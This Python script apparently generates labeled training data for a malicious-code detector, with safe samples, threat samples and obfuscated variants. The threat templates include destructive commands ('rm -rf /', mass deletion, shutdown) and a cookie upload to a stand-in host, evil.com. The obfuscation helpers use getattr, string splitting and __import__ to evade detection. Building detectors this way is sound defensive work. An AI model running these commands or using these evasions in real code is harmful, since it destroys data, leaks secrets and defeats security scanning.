# adversarial_trainer.py
import os
import shutil
from pathlib import Path
import random
import re

# --- Base threat templates (from synthetic_generator.py) ---
THREAT_TEMPLATES = [
    "import os\nos.system('rm -rf /')",
    "import subprocess\nsubprocess.Popen(['python', '-c', 'import os; os.system(\"calc\")'])",
    "import socket\ns = socket.socket()\ns.connect(('127.0.0.1', 4444))\ns.send(b'backdoor')",
    "import os\nos.popen('whoami').read()",
    "import sys\nsys.modules['os'].system('shutdown /s /t 0')",
    "import requests\nrequests.post('http://evil.com/steal', data={'cookie': 'abc'})",
    "exec('import os; os.system(\"del /f /q C:\\\\*\")')",
    "import base64\ncode = 'aW1wb3J0IG9zO29zLnN5c3RlbSgiZWNobyBlaWwiKQ=='\nexec(base64.b64decode(code).decode())",
    "import ftplib\nftp = ftplib.FTP('evil.com')\nftp.login('user','pass')\nftp.retrlines('LIST')",
    "import smtplib\nsmtp = smtplib.SMTP('smtp.evil.com')\nsmtp.sendmail('a@a.com', 'b@b.com', 'malicious')",
]

# --- Safe templates ---
SAFE_TEMPLATES = [
    "import math\ndef calculate(x):\n    return math.sqrt(x) + math.pi\nprint(calculate(10))",
    "import json\ndata = {'name': 'test'}\nwith open('data.json', 'w') as f:\n    json.dump(data, f)",
    "import re\ntext = 'Hello 123'\nmatch = re.search(r'\\d+', text)\nprint(match.group())",
    "import datetime\nnow = datetime.datetime.now()\nprint(now.strftime('%Y-%m-%d'))",
    "import collections\ncounter = collections.Counter(['a','b','a'])\nprint(counter)",
]

# --- Obfuscation functions (from adversarial_test.py) ---
def obfuscate_py(code):
    """Apply common Python obfuscations."""
    # 1. getattr evasion
    code = code.replace('os.system', 'getattr(os, "system")')
    # 2. String concatenation
    code = code.replace('"system"', '"sys" + "tem"')
    code = code.replace("'system'", "'sys' + 'tem'")
    # 3. __import__ evasion
    code = code.replace('import os', 'os = __import__("os")')
    # 4. Variable renaming
    code = code.replace('os', 'o')
    return code

def mutate_code(code):
    """Add random mutations."""
    mutations = [
        lambda s: s.replace('exec', 'ex' + 'ec'),
        lambda s: s.replace('eval', 'ev' + 'al'),
        lambda s: s.replace('system', 'syst' + 'em'),
        lambda s: s.replace('import', '_import_'),
    ]
    for _ in range(random.randint(1, 3)):
        code = random.choice(mutations)(code)
    return code

def generate_adversarial_training_data(safe_dir="training_data/safe", threat_dir="training_data/threat", num_variants=20):
    """Generate and add adversarial variants to the training data."""
    os.makedirs(safe_dir, exist_ok=True)
    os.makedirs(threat_dir, exist_ok=True)
    
    # Add safe variants
    for i, template in enumerate(SAFE_TEMPLATES):
        with open(os.path.join(safe_dir, f"adv_safe_{i+1}.py"), 'w') as f:
            f.write(template)
    
    # Add original threats
    for i, template in enumerate(THREAT_TEMPLATES):
        with open(os.path.join(threat_dir, f"threat_{i+1}.py"), 'w') as f:
            f.write(template)
    
    # Add adversarial variants of threats
    adv_count = 0
    for template in THREAT_TEMPLATES:
        for _ in range(2):  # Generate 2 variants per template
            variant = obfuscate_py(template)
            variant = mutate_code(variant)
            adv_count += 1
            with open(os.path.join(threat_dir, f"adv_threat_{adv_count}.py"), 'w') as f:
                f.write(variant)
    
    print(f"[*] Generated {len(SAFE_TEMPLATES)} safe + {len(THREAT_TEMPLATES) + adv_count} threat variants.")
    print("[*] Training data ready for adversarial training.")

if __name__ == "__main__":
    generate_adversarial_training_data()